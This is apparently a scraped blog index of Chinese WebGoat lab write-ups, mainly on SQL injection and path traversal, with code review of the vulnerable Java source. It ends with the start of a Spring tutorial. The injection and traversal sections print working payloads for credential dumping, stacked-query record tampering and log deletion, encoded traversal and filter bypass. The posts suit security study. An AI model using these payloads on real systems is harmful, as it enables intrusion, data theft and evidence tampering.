PageLesson4\n本质就是f12，打开开发者工具\n\n简单放几张图吧，没什么难度。\n\n猜想这里的代码逻辑是产生随机数，然后判断\n\n\n2.Developer Tools PageLesson6\n\n\n0x05 Crypto Basics本章简单介绍了一些加密&#x2F;解密方式。\nbase64加密，URL编码，HTML编码，UU编码，XOR编码……………………\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-02-SQL注入","url":"/2022/03/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-02-SQL%E6%B3%A8%E5%85%A5/","content":"WebGoat代码审计-02-SQL注入\n\nWebGoat 代码审计-02-SQL 注入\n要学 SQL 注入，必须要知道 SQL 注入的根本：使得浏览器中的 SQL 语句闭合。\n其余废话就不多说了，主要是针对于代码审计方面的 SQL 注入，从根本上理解 SQL 注入。\n\n0x01 SQL Injection (intro)1. SQL Injection (intro) PageLesson2 select\nSelect 语句的使用\n\n靶场界面如图所示\n\n\n其中有一段：\nThere are three main categories of SQL commands:\n\n-   Data Manipulation Language (DML)\n    \n-   Data Definition Language (DDL)\n    \n-   Data Control Language (DCL)\n这里意思是让我们掌握一些基本的 SQL 语言，包括：\nDML(data manipulation language)：数据操作语言，用于执行查询的语法。例如增删改查\nSELECT UPDATE DELETE \nINSERT INTO\n\nDDL(data definition language)：数据定义语言，创建或删除表格，定义索引等。例如\nCREATE DATABASE - 创建新数据库\nALTER DATABASE - 修改数据库\nCREATE TABLE - 创建新表\nALTER TABLE - 变更（改变）数据库表\nDROP TABLE - 删除表\nCREATE INDEX - 创建索引（搜索键）\nDROP INDEX - 删除索引\n\nDCL(Data Control Language)：数据库控制语言，授权，角色控制等。例如\nGRANT 授权  \nREVOKE 取消授权\n\nTCL(Transaction Control Language)：事务控制语言，例如\nSAVEPOINT 设置保存点  \nROLLBACK  回滚  \nSET TRANSACTION\n\n\n靶场要求: Try to retrieve the department of the employee Bob Franco。也就是查询 Bob Franco是哪个部门的。\n注意，此时的我们是有 admin 权限的，所以直接写查询语句即可。\n语法：”select something from table where colunm &#x3D; *”\n\nselect department from employees where first_name='Bob' and last_name='Franco';\n\n\n\n如此，我们的查询就成功了~ 老规矩，代码审计\n\n\n这里设置了简单的 SQL 查询语句，并设置了 TYPE_SCROLL_INSENSITIVE: 也就是对底层数据变换不敏感； 还设置了 CONCUR_READ_ONLY————只读。后面语句的意思：判断 SQL 语句查询出的 department 是否等于 Marketing。所以这里，我们输入如下语句也可以实现：\nselect 'Marketing' as department from employees;\n\n\n2. SQL Injection (intro) PageLesson3 update\nupdate 语句的使用\n\n靶场界面如图所示\n\n\n\n直接做题，将 Tobi Barnett 的部门修改为 Sales。\n语法: “update tablename set colunm&#x3D;’’ where colunm &#x3D; * “”\n\npayload:\nupdate employees SET department = 'Sales' where first_name='Tobi' and last_name='Barnett';\n\n\n如此，我们的查询就成功了~ 老规矩，代码审计\n\n\n代码判断 department 是否等于 Sales。和上题类似，可以通过这种方法绕过\nupdate employees set department='Sales'\n\n3. SQL Injection (intro) PageLesson4 alter\nAlter 语句的使用\n\n靶场界面如图所示\n\n\n\n直接做题，要求将列 “phone”（varchar（20））添加到表 “employees”。\n语法: “alter table tablename add colunmname colunm type”\n\npayload：\nalter table employees add phone varchar(20);\n\n\n\n老样子，源码\n\n\n我们看到这里的语句\nResultSet results = statement.executeQuery(\"SELECT phone from employees;\");\n\n在我们执行完 SQL 语句之后，phone 列表已经被插入到了 employees 表里，此时的变量 results 被赋值，才有了后面的以切判断。\n4. SQL Injection (intro) PageLesson5 grant\nGrant 命令的使用，事关权限问题\n\n靶场界面如图所示\n\n\n\n直接做题，要求将表 “grant_rights” 的权限开通给用户 “unauthorized_users”。\n语法: “grant all on table to user;”\n\n这里的 all 可以替换为其他的权限，例如增删改查。\n老样子，源码\n\n\n我们看到这里的 SQL 语句:\nSELECT * FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES WHERE TABLE_NAME = ? AND GRANTEE = ?\n\nTABLE_NAME &#x3D; GRANT_RIGHTSGRANTEE &#x3D; UNAUTHORIZED_USER也就是检查是否存在，okpass\n\nSQL 注入一般存在于这种语句中 &quot; SELECT * FROM users WHERE name = &#39;&#39; &quot;;\n\n原理：闭合 SQL 语句\n\n\n5. SQL Injection (intro) PageLesson9 万能密码靶场界面如图所示\n\n\n\n直接做题，看着就像是万能密码\n题目里面告诉了我们 SQL 查询语句\n\n\"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '\" + lastName + \"'\";\n这里我们选择 Smith’ or ‘1’&#x3D;’1,成功~\n\n\n得到的 SQL 语句：\nSELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'\n因为 last_name 这里等于 **’Smith’ or ‘1’&#x3D;’1’**永远为真，\nSQL 语句也就因此变换为\nSELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE\n而所有的数据对于 **last_name&#x3D;TRUE **都成立，故可以查询出所有的数据。\n老样子，源码\n\n\n这一行的代码：\n\naccout: Smith’operator: orinjection: ‘1’&#x3D;’1\n\n\n\n而传进去的参数 accoutName &#x3D; Smith&#39; or &#39;1&#39;=&#39;1也就有了我们看到的 SQL 语句：\nSELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'\n\n6. SQL Injection (intro) PageLesson10 数字型注入所谓数字型注入即参数为数字，不需要添加其他符号来做闭合，如 id=1 or 1=1 的形式\n测试数字型注入的步骤：(1) 加单引号，id&#x3D;3’对应的sql：select * from table where id&#x3D;3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；\n(2) 加 and 1&#x3D;1，id&#x3D;3 and 1&#x3D;1对应的sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面如任何差异；\n(3) 加and 1&#x3D;2，id&#x3D;3 and 1&#x3D;2对应的sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异\n如果满足以上三点，则可以判断该URL存在数字型注入。\n\n靶场界面如图所示\n\n\n\n题目已经给了 SQL 查询语句\n\n\"SELECT * FROM user_data WHERE login_count = \" + Login_Count + \" AND userid = \"  + User_ID;\n\n再结合题目提示 “数字型注入”，直接在 Login_Count 中输入 1 or 1=1 —————进行最基本的数字型注入，查看回显。\n\n\n呃，居然没有任何回显，意料之外……又在 User_Id 框中输入 1 or 1&#x3D;1，还是不对。\n\n\n前两种情况都错了，尝试第三种情况，Login_Count 的值随意输入，将 User_Id 的值输入为 1 or 1&#x3D;1\n\n\n终于成功了，可是为什么 Login_Count 的值是 1 or 1&#x3D;1 时总是得不到理想的回显呢？\n老样子，源码\n\n\n变量：login_count: 1userid: 1 or 1&#x3D;1\n\n这里突然发现，SQL 语句同之前的不一样了，出现了一个新朋友————“?”\n\n对应的 SQL 语句，我们把它单独拉出来\n\n\"SELECT * From user_data WHERE Login_Count = ? and userid= \" + accountName;\n\n“?” 在 SQL 语句中起到了预编译的作用，当用户数据来的时候,就会直接替换掉? 这里不存在再次编译, 所以也就不会解析用户数据了，能够很好的预防 SQL 注入。后面的代码会将 Login_Count 转换成数字类型，如果没有出错才会进行后续的操作。\n简而言之，预编译读入了输入的字面意思，从而不将其与 SQL 语句混淆。由此可见，预编译对于 SQL 注入的预防功能还是卓有成效的 ~\n7. SQL Injection (intro) PageLesson11 字符型注入\n字符串注入一般需要通过单引号来闭合的。同数字型注入类似，但数字型注入不需要单引号来闭合。\n字符型注入有一个更出名的名字 ———— 万能密码\n\n测试字符型注入的步骤：(1) 加单引号，id&#x3D;3’ and password&#x3D;123由于加单引号后变成三个单引号，则无法执行，程序会报错；一般的报错都是像这样。\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;123&#39;&#39; at line 1\n\n\n(2) 尝试绕过，通过 1’ or ‘1’&#x3D;’1此时的 SQL 语句会变成这样：\nSELECT * FROM table WHERE first_name = '1' and last_name = '1' or '1' = '1'\n\n靶场界面如图所示\n\n\n\n用万能密码进行绕过，题意，服务器通过 “auth_tan” 来判断是否为员工本人。那么这里万能密码的应用点就应该在 “auth_tan”\n\n\n\n老样子，源码\n\n\n很明显，我们通过万能密码的方式拼接了 SQL 查询语句。\n8. SQL Injection (intro) PageLesson12 堆叠注入靶场界面如图所示\n\n\nLesson12 与 Lesson11 的 SQL 查询语句并没有改动，需要我们将 John Smith 的工资拉高，拉的比任何人都要高。\n\n要完成上述所说的操作，唯一想到的只有堆叠注入了。\n堆叠注入：同时执行两句 SQL 语句。最简单的堆叠注入语句\n\nselect * from users;DELETE FROM test\n\n先查询 user 表，然后再从 test 数据库里删除 user 表。在本题中，要将 John Smith 的工资修改地比另外两人高，直接构造 payload :\n1'; update employees set salary=9999999 where last_name='Smith';-- -\n\n最后的 -- - 是将 SQL 语句后面的部分注释掉，从而实现修改数据。\n\n\n关键拼接部分的源码与上题完全相同，不再加以分析。\n9. SQL Injection (intro) PageLesson13 干完坏事记得删历史记录！\n之前看某些入门级的黑客书籍时，总会说到删除历史记录什么的，直到现在才对删除历史记录有一定的感受。\nSQL 的操作都保存在一个名为 “access_log” 的表格中。所以我们要删除历史记录的话，必然是执行 drop access_log 的命令\n\n靶场界面如图所示\n\n\n点击 Search logs，可以发现我们对数据库的所有操作，包括之前违规 “涨工资” 的操作。\n\n\n想到是对数据库的操作，立马想到堆叠注入。构造 payload\n1';drop table access_log; -- -\n\n至此，intro 部分全部通关。\n\n\n\n0x02 SQL Injection (advanced)前文 intro 模块介绍了一些基本的 SQL 语句，Advanced 部分将介绍多重 SELECT，也就是我们常说的联合注入 ———— UNION SELECT\n\n在介绍 UNION SELECT 之前，先来熟悉以下 SQL 语句当中的一些特殊符号，这在后续的渗透中经常会用到。\n\n1. 联合注入前的 PreparationPrepare① : SQL 语句当中的特殊符号(1) 常见注释符：\n行内注释符号/**/； 应用 —— /* 123 */，能够将123注释。\n行外注释符号 -- ；#; 应用 —— SELECT * FROM users WHERE name = &#39;admin&#39; -- AND pass = &#39;pass&#39;可以将 “–” 后的所有内容都注释掉。\n\n(2) 常见查询符：\n提供多组查询，也就是堆叠注入，符号为 ; 应用 —— SELECT * FROM users; DROP TABLE users;\n\n(3) 常见连接符：\n用于字符串的连接，单引号&#39;，加号+，管道符||， 应用 —— SELECT * FROM users WHERE name = &#39;+char(27) OR 1=1\n\nPrepare②: SQL UNION SELECT 联合查询\n联合查询的用法：\n\nSELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;\n这时候肯定有好多小伙伴要好奇问了，你说了这个联合查询，那联合查询没有任何限制吗？———————— 答案当然是有限制！\n在使用 UNION SELECT 联合查询之前，必须要先判断数据表有多少列，试想一下，如果数据表有三列，而 UNION SELECT 了四列，必然会导致报错。\nPrepare③: SQL UNION SELECT 的两个前提条件条件一、 SELECT 的列数与数据库的列数相等：举个栗子: 数据库有 3 列，那么 union 查询时的语句应该符合如下基本构造\n1' union select 1,2,3 #\n如果数据库有 4 列，构造如下\n1' union select 1,2,3,4 #\n\n条件二、 查询的数据要与原数据库列的数据类型匹配乍一眼看这段话是比较抽象的，我们还是简单举个例子。\n大家都知道，在新建数据库时，我们必须命名 table_name, column_name 以及 column_type ————这个东西就是数据库列的数据类型。\nCREATE TABLE Persons  \n(  \nPersonID int,  \nLastName varchar(255),  \nFirstName varchar(255),  \nAddress varchar(255),  \nCity varchar(255)  \n);\n\n对应这一个新的数据表 Persons，我们的联合查询应该如下\n1' union select 1,\"张三\",\"李四\",\"322111\",\"杭州\" #\n如果第一个数据输入的并不是 int 类型的数据的话，一定会遇到报错，我们这里用’1’作为例子。\nConversion failed when converting the varchar value '1' to data type int.\n\n\n\n那么问题又来了，当我们实战渗透，进行攻击的时候，肯定不知道对方的数据表有几列啊，这时应该怎么办呢？\n\nSolution1 通过 ORDER BY 命令假设是字符型注入\n' ORDER BY 1 --\n' ORDER BY 2 --\n' ORDER BY 3 --\netc.\n\n\nSolution2 通过 UNION SELECT NULL 来判断列数有多少个列，就写多少个 NULL\n' UNION SELECT NULL --\n' UNION SELECT NULL,NULL --\n' UNION SELECT NULL,NULL,NULL --\netc.\n\n特别需要注意的：在 Oracle 数据库中，需要改为\n\nUNION SELECT NULL FROM DUAL --\n\n\n\n好啦，该讲的知识点也都讲完了，是时候打靶场了~\n\n2. SQL Injection (advanced) PageLesson3靶场界面如图所示\n\n\n\n题目告诉我们已经存在的两个数据表 user_data 和 user_system_data\n两个任务：1. 从表中获取到所有的数据；2. 搞到 Dave 的密码。\n\n看到这个 Get Accout Info 的按钮，这和 Check Password的一定是分开的，那么我们先尝试闭合 SQL 语句，在第一个查询框内输入 1&#39; or &#39;1&#39;=&#39;1\n\n\n\n解法一、使用堆叠注入根据我们前文提到的堆叠注入，通过分号隔开两条 SQL 语句，payload：\n1'; select * from user_system_data -- \n\n\n\n由此，我们爆出了 user_system_data 表的数据，也得到了 Dave 的 password。但是 WebGoat 此时让我们再使用 UNION 查询来完成 SQL 注入。\n解法二、使用联合注入\n从之前的尝试中，我们发现使用万能密码注入时，返回的数据有七列。而 user_system_data 表只有4列，所以需要将从 user_system_data 表中查到的数据补齐到7列。\n7列数据： USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT\n目前 user_system_data 有4列：userid， user_name, password, cookie，将其补齐到7列。由此思考出 UNION SELECT 的数据：\n\nuserid, user_name, password, null, null, cookie, null\n\n进一步构造 payload：\n1' or 1=1 union select userid,user_name,password,null,null,cookie,null from user_system_data --\n这样子我们可以爆出所有的数据\n\n\n还有一种只爆出 Dave password 的 payload，在这一种 payload 中，可以很明显地看出来 Union 联合查询要满足的第二个条件———————— 查询的数据要与原数据库列的数据类型匹配。\n1'or 1=1 union select 1,'2','3','4','5',password, 7 from user_system_data where user_name='dave'--\n\n\n\n老样子，源码\n\n\n源码中还是对 SQL 语句不加任何的过滤，不同的是这里出现了正则表达式，判断我们是否在查询语句中使用了 UNION 联合查询。\n3. SQL 盲注在 WebGoat 网站上对盲注的英文描述机翻过来之后，比较不准确，这里分享一下自己的理解。\n(1) 什么是 SQL 盲注\n首先 SQL 盲注很重要的一点是无回显\n其次 SQL 盲注存在非显性回显，也就是说从侧面可以看出回显\n\n\n展开来给大家讲一讲\n\nSQL 盲注的意思是，注入数据到 SQL 语句中，服务器不会返回数据库里的详细信息 ———————— 无回显的表现。\n只会给出 true 或 false 的信息，或者给出延时的信息，或者一些其他的信息(比如报错) ———————— 这里就是我所说的侧面回显。\n所以，我们只能根据有限的信息去获取数据库中更多地信息，这种方式像盲人摸象一样，只能一点一点的去收集数据库的信息（每一次的true表示获取一个有效信息），来慢慢形成对整个数据库信息的理解（表名是什么，列名是什么），最终达到获取数据库中数据的目的（获取某个表的某个值）。\n(2) 判断 SQL 盲注的方法\n最重要的一定是先找注入点，判断是否存在注入点，多试试各种地方，比如 Login 的登录界面，Register 注册界面等\n\n1. 针对布尔盲注，也就是 True 与 False 的回显\n布尔盲注，只会根据你的注入信息返回 True 或 False，也就没有了之前的报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;123&#39;&#39; at line 1\n\n布尔盲注判断方法：\n\n判断注入点1’ and 1&#x3D;1   &#x2F;&#x2F; 页面返回有数据1’ and 1&#x3D;2   &#x2F;&#x2F; 页面返回无数据此种情况可以推出存在 SQL 注入\n判断当前页面字段数1’ and 1&#x3D;1 order by 2 –   &#x2F;&#x2F; 页面返回有数据1’ and 1&#x3D;2 order by 3 –   &#x2F;&#x2F; 页面返回无数据判断出当前页面字段数为 2\n\n\n时间盲注判断方法\n\n判断注入点的 SQL 语句1’ and 1&#x3D;1–  &#x2F;&#x2F; 页面返回有数据1’ and 1&#x3D;2– &#x2F;&#x2F;  页面返回有数据页面的返回没有变化，可能是盲注；\n判断是何种盲注Select name from table where id &#x3D; 1 and if（布尔表达式，sleep(5),(1))； &#x2F;&#x2F; 条件为真时延时 5s可以通过简单的id &#x3D; 1’ and sleep(2)判断是否存在时间盲注\n\n\n还有一些深度用法，我们以 WebGoat 靶场下的题目为例说明\n4. SQL Injection (advanced) PageLesson5 布尔盲注靶场界面如图所示\n\n\n(1) 探测注入点\n界面中有 Login 与 Register 两个界面，我们依次寻找注入点。注入点无非四处，Login 界面下的用户名密码，Register 下的用户名密码。\n\nLogin 界面下对 username 进行注入点探测，输入1&#39; or &#39;1&#39;=&#39;1\n\n\n得到回显：”No results matched, try again.”这里得到的回显代表了不存在 SQL 注入，如果存在 SQL 注入的话必然是会报错的。\n在密码处尝试探测注入点，得到的结果同上。\n\n尝试后发现，Login 界面下的 Username 与 Password 都不存在 SQL 注入\n\n转战 Register 界面，我们先注册一个名为 hello 密码为 123 的账号。\n\n\n注册完之后，在 Register 界面再进行 SQL 注入点的探测\n\nhello’ or 1&#x3D;1 –hello’ or 1&#x3D;2 –hello’ and 1&#x3D;1 –hello and 1&#x3D;3 –\n\n先贴四张图，给大家看一看回显\n\n\n\n\n\n更直观一些，我们列一张表格总结一下\n\n\n\nusername\n回显\n\n\n\nhello’ or 1&#x3D;1 –\nalready exists please try to register with a different username.这说明存在SQL注入，因为如果不存在SQL注入，用户名**”hello’ or 1&#x3D;1 –”是不存在的，不应该提示『已存在』。说明“hello’ or 1&#x3D;1 –”**SQL语句被解析了\n\n\nhello’ or 1&#x3D;2 –\nalready exists please try to register with a different username.  说明存在SQL注入，否则用户名为**”hello’ or 1&#x3D;2 –”**的用户是不存在的。\n\n\nhello’ and 1&#x3D;1 –\nalready exists please try to register with a different username.  说明存在SQL注入，否则用户名为**””hello’ and 1&#x3D;1 –””**的用户是不存在的。\n\n\nhello’ and 1&#x3D;2 –\nUser hello’ and 1&#x3D;2 – created, please proceed to the login page.如果单从这一条来说，是不能确定是否存在SQL注入的，因为有两种可能性。可能1： 用户名为hello’ and 1&#x3D;2 – 的用户确实不存在，所以可以注册。可能2：and 1&#x3D;2 起作用了，它的结果是 false，对于 select * from xxx_table where false 来说，是始终不会查询到数据的。所以可以注册\n\n\n由上述分析，我们可以确定 Register 处存在 SQL 盲注。\n(2) 进阶使用&#x2F;理解布尔盲注\n题目目的：让我们以 Tom 的身份登录\n\ntom的组合有好多中写法。简单测试，发现在数据库中已经存在的用户名是 tom ~\n\n\n如果想要以 tom 的身份登录无非是两种方式一、通过联合注入爆出 tom 的数据 ———— 使用到布尔盲注二、篡改 tom 的密码 ——— 运用我们之前所讲的堆叠注入第一种方式更加切题，我们先从第一种，通过布尔盲注的方式来\n解法一、使用布尔盲注在讲解题之前要先提一下一个函数 —- substring，作用是截取字符\nsubstring(string ,1,3) // 取string左边第1位置起，3字长的字符串。\n==》 输出结果为：str\n\n\n基本思路是先爆表，再爆库，再爆列，再爆值。毕竟是盲注嘛，还是很累的。这里列举一下爆表&#x2F;库&#x2F;列的 payload：\n\n爆表名：1’ or substring((select schema_name from information_schema.schemata limit 0, 1), 1, 1)&#x3D;’I’;–\n\n\n需要改动 substring 的数值，例如，爆出第一位之后，需要改变payload 为 substring(语句,2,1) 用来爆破第二位。爆破可以使用 burpsuite\n\n\n\n爆破的结果：\n\n\n由此可以看出，schema 名的第一个字母为 C，接着继续爆…………以此类推\n\n爆库‘ or substring((select table_name from information_schema.tables where table_schema&#x3D;’刚获取到的表名’ limit 0, 1), 1, 1)&#x3D;’a’;–\n\n\n爆列‘ or substring((select column_name from information_schema.columns where table_name&#x3D;’刚获取到的table名’ limit 0, 1), 1, 1)&#x3D;’a’;–\n\n这里直接猜测列的名字是 password，构造 payload：\ntom' or password='12345 //用这个语句，判断 password 列对应的是密码\n\n\n当我们已经爆出列的时候，就可以开始爆密码了。\n\npayload：\ntom' and substring(password,1,1)='a // 爆密码的第一位\n\n第一位字母的爆破如图\n\n\n\n对于 tom’ 来说，只有 tom and true时才会是 True，否则会报错，也就是说，只有爆对字母才会成功 ~\n最后得出 tom 的密码是 thisisasecretfortomonly\n解法二、使用堆叠注入爆表，爆库，爆列的几步走和上面一致\n只是在篡改密码时的 payload 不同了\n1'; update XXX_TABLE set PASSWORD_COLUMN = '123456'; --\n然后以用户名tom和密码123456登录即可。\n0x03 SQL 注入的基本防御手段1. 构造不可变的查询1.1 静态查询SELECT * FROM users WHERE user = \"'\" + session.getAttribute(\"UserID\") + \"'\";\n\n这里的 UserID 就不经过拼接，而是直接通过 session.getAttribute 读取。\n1.2 预编译 ———— 也就是使用问号\n预编译的问题在上文我们也提到过 ~\n\nString query = \"SELECT * FROM users WHERE last_name = ?\";\nPreparedStatement statement = connection.prepareStatement(query);\nstatement.setString(1, accountName);\nResultSet results = statement.executeQuery();\n\n很多小伙伴们觉得预编译可以完美防止 SQL 注入，其实不完全是这样的。\n2. 使用转义字符转义字符，也就是过滤掉一些特殊的字符，比如单引号、括号这种，能够很好的防御 SQL 注入。\n3.对访问数据库的 Web 应用程序进行 WAF 操作。","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-03-目录遍历漏洞","url":"/2022/03/22/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-03-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","content":"WebGoat代码审计-03-目录遍历漏洞\n\nWebGoat代码审计-03-目录遍历目录遍历攻击主要分为两块\n\n一、利用目录遍历的文件上传\n二、利用目录遍历的信息泄露\n\n0x01 Path Traversal PageLesson2靶场部分靶场界面如图所示\n\n\n\n题目的要求，让我们讲图片上传至非本目录下。\n本来要上传的目录是：&#x2F;PathTraversal&#x2F;user&#x2F;tests 下，我们能够通过目录遍历的方式，将要上传的图片上传至其他目录\n\n这种情况我们一般想到的是 ..，回忆一下在 Linux 中，返回上一级目录时的命令：cd ..，在目录遍历漏洞中也通用。\n利用 Burpsuite 抓包，将 “test” 修改为 “..&#x2F;test”，也就是 &#x2F;test 目录的上一级目录。\n\n\n如图，修改成功，将头像上传至 &#x2F;PathTraversal&#x2F;user 目录下了。\n代码审计部分查看源代码\n\n\n很显然，上传点在红框中，获取 POST 表单当中的 UploadedFile 与 fullName，接下来，我们回到之前抓的包，查看一下 uploadedFile 与 fullName 是什么。\n\n\nuploadedFile 是图片的内容\n\n\nfullName 是我们文件名，也就是 test，这里就是由于 fullName 没有做好过滤才导致文件上传的目录遍历。换句话说，也就是刚刚我们的操作，将文件上传到了上级文件夹当中。\n代码审计继续往下读，发现一行代码\nreturn super.execute(file, fullName);\n\n选择查看父类 ———— ProfileUploadBase，并关注几行重点语句\n\n\n先是判断传进来的 file 是否为空。接着下面语句，规定了目录 &#x2F;PathTraversal&#x2F;UserName\nvar uploadDirectory = new File(this.webGoatHomeDirectory, \"/PathTraversal/\" + webSession.getUserName());\n\n继续往下看我们的代码，mkdir，也就是在 &#x2F;PathTraversal&#x2F;UserName 目录下创建一个新的文件夹，主要是以 fullname 的名字来命名，就是这里也就是没有对 fullname 传进来的参数进行一个过滤才导致目录穿越。\nuploadDirectory.mkdirs();\n// 创建一个文件夹 文件夹名字为fullname，这里应该对fullname进行一个过滤\nvar uploadedFile = new File(uploadDirectory, fullName);\n// 直接进行文件夹的创建\nuploadedFile.createNewFile();\nFileCopyUtils.copy(file.getBytes(), uploadedFile);\n\n\n0x02 Path Traversal PageLesson3靶场部分靶场界面\n\n\n\n靶场提示说，..&#x2F; 的目录遍历方式已经行不通了，但是还是存在目录遍历的漏洞，让我们寻找寻找。\n\n先头铁，试一试上一题  ..&#x2F; 的目录遍历攻击。\n\n\n果不其然，失败了。我们尝试使用 ..././ 复写的方式替代 ../ 进行目录遍历攻击\n\n\n没想到直接成功了，本以为还需要其他的方式进行绕过。\n代码审计部分\n\n我们看到 WebGoat 对 ..&#x2F; 的目录遍历攻击进行了防御，但是只是最简单的，将 ..&#x2F; 替换成了 空白。\nreturn super.execute(file, fullName != null ? fullName.replace(\"../\", \"\") : \"\");\n\n其余没有进行任何过滤，使用复写绕过，…&#x2F;.&#x2F; 中的 ..&#x2F; 被解析成了’’，那么就变成了 ..&#x2F;，成功目录遍历攻击。\n0x03 Path Traversal PageLesson4靶场部分靶场界面如图所示\n\n\n还是同之前的步骤一样，先抓包看看。并进行简单的目录遍历攻击\n\n\n当使用上一题的复写攻击也失败了，思考新的攻击手段。尝试换一个目录遍历的攻击点，之前我们的攻击点一直是在目录上，也就是源代码里的 “fullName”，现在转到文件名上，也就是源代码里的 “UploadedFile”\n\n我们将原本的 “logo.png”，修改为 “..&#x2F;logo.png”，成功实现了目录遍历攻击。\n代码审计部分\n\n这里比较简单，并未对 “uploadedFile” 进行过滤\n0x04 Path Traversal PageLesson5\n题意，让我们用其他方式访问 path-traversal-secret.jpg\n\n那莫非意思是，直接访问 &#x2F;path-traversal-secret.jpg 不通，只能通过目录遍历的方式访问？\n我这里尝试了直接遍历 .jpg 的文件，以及通过带参请求 .jpg 文件，均得到 400 的返回。\n\n\n感觉没什么思路了，直接看源码吧，根据源码来找思路，前面一段代码是产生随机数，用来调用文件夹里面的静态图片的代码，这里就不贴了。\n重点关注后面一段代码\n\n\n首席按是第 85 行这里，代码是通过传进去的 GET 请求参数 ?id 进行判断。86 行，创建了一个新的文件类型的变量，再返回到上文去看。这里尝试在 &#x2F;random-picture&#x2F; 的接口下对 id 进行目录遍历的设置，即 ?id=../，可是被过滤了。\n\n\n第 81 行规定了，参数中不允许存在 .. 或 &#x2F; ，如果存在就 400\n\n\n由于后端在获取参数值之后会进行一次 url 编码，所以我们可以利用 url 编码对 ../ 进行编码，从而实现绕过。\n\n也就是说，我们的 payload?id&#x3D;%2e%2e%2f\n\n\n\n成功的绕过，看到了一丝曙光但是我们发现，这里并没有我们要找的那个文件  path-traversal-secret.jp，所以继续往上一级目录寻找。\n\n\n这边成功获取到了对应的文，最后一步的 payload\n?id&#x3D;%2e%2e%2f%2e%2e%2fpath-traversal-secret\n\n\n\n0x05 Path Traversal PageLesson7靶场部分靶场界面如图所示\n\n\n\n题意：上传一个 Zip 文件，而这一个 Zip 文件能够替换头像；也就是使用 Zip 覆盖当前图像。\n\n直接上传一个 Zip 文件夹即可通过靶场\n代码审计部分\n\n这里，由 Zip 结尾的文件可以上传。\n因为 Zip 文件当中可以存在 ..&#x2F; 的文件内容，因此 Zip 的上传也会导致目录遍历漏洞，这种问题一般存在于 Android 开发上。\n\n\n0x06 目录遍历的防御手段\n对文件上传方面进行严格限制，不允许存在 ../ 的上传。\n限制用户输入的路径在某一个范围内。\n当用户请求访问文件&#x2F;目录时，构造文件&#x2F;目录（若存在）所在的的完整路径，并标准化所有字符（如%20转为空格）；\n\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"Spring开发学习","url":"/2022/08/18/Spring%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/","content":"Spring开发学习\n\nSpring开发学习\n代码已同步至 GitHub，有兴趣的师傅们可以自取 JavaSecurityLearning\n\n0x01 前言因为最近要开始看内存马了，按照 johnford 大师傅的说法，内存马里面会用到很多一些其他的知识；比如 Spring，Tomcat 以及 EL 表达式等等 ……\n\n所以最近先开始最简单与熟悉的 Spring 开发学习吧 ~\n\n生成 getter，setter 方法：alt + insert\n0x02 Spring 简介关于 SpringSpring 理念 : 使现有技术更加实用 . 本身就是一个大杂烩 , 整合现有的框架技术\n\nSSH：Struct2 + Spring + Hibernate\nSSM: SpringMVC + Spring + Mybatis\n\nSpring 的一些特点：\n轻量级框架，特点 IoC：控制反转；AOP：切面编程。\n组成Spring 毕竟也是一个框架，所以框架肯定是支持很多功能的，我们要实现功能，或者说要通过框架来完成业务，只需要打配置即可。Spring 框架支持的一些功能如下图所示。\n\n\n这里可以简单解释一下几点东西：\n\n最底下一定是我们的 Core，也就是所谓的 “核”\n往上走支持一些编程思想：IOC，AOP\n还支持 ORM（也就是处理数据库等语句，可以类比为 Mybatis）\n还支持很多 Web，比如 Web Application，Servlet 等\n\n之前学习有个误区，觉得应该先学 SpringBoot 再去看其他的，其实正常的学习路线应该是：Spring —-&gt; SpringBoot —-&gt; SpringCloud 这个样子；\n在 Spring 的官网上，Spring.io 有一条这样的学习路线：\n\n\n为什么 Spring 之后是 SpringBoot，然后是 SpringCloud 呢？因为 Spring 的配置非常繁琐，有时候我们不得不配置一些与我们本身的 Web 应用关系不大的东西。所以 SpringBoot 顺势而生。\n0x03 Spring 的核心之一 IOCIOC先新建一个项目，并创建 Module，导入 Maven 的 jar 包。\n\n\njar 包如下\n&lt;dependency>  \n &lt;groupId>org.springframework&lt;/groupId>  \n &lt;artifactId>spring-webmvc&lt;/artifactId>  \n &lt;version>5.3.16&lt;/version>  \n&lt;/dependency>  \n  \n&lt;dependency>  \n &lt;groupId>org.springframework&lt;/groupId>  \n &lt;artifactId>spring-jdbc&lt;/artifactId>  \n &lt;version>5.3.16&lt;/version>  \n&lt;/dependency>\n\n后续整合的时候会用到 jdbc 的，所以这里可以先导进来。\n\n正式开始我们的 IOC\n\n传统的业务实现在看 IOC 的编程思想之前，我们可以先看一看传统的编程思想：\n传统的编程思想：Controller 层写接口，去调用 Service 层，Service 层里面有一个 Service 接口，还有一个 ServiceImpl 的实现类，具体的业务是写在 ServiceImpl 里面的。\nService 层去调用 Dao 层，也就是我们的实体类，我们的 Dao 层有一个 Dao 的抽象接口，还有一个 DaoImpl 的实现类。\n\n大致的流程就是 Controller 调 Service 调 Dao\n\n我们用代码来实现一下，看一看为什么要用到 IOC 的这种编程思维。\nUserDAO.java\npackage DAO;  \n  \npublic interface UserDAO &#123;  \n    public void getUser();  \n&#125;\n\nUserDAO 的实现类 ———— UserDAOImpl.java\npackage DAO;  \n  \nimport DAO.UserDAO;  \n  \npublic class UserDAOImpl implements UserDAO &#123;  \n    @Override  \n public void 